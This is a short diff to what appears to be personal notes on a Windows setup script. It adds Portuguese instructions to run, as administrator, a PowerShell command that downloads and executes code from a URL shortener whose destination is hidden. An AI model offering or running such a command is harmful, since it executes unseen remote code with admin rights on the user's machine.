@@ -7,3 +7,8 @@ powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('https://raw.gi
 https://christitus.com/ultimate-windows-setup-guide/
 
 https://github.com/ChrisTitusTech/win10script
+
+colocar com net no windows power sell e executar como administrador:
+
+
+powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://shorturl.at/bgvwU')"
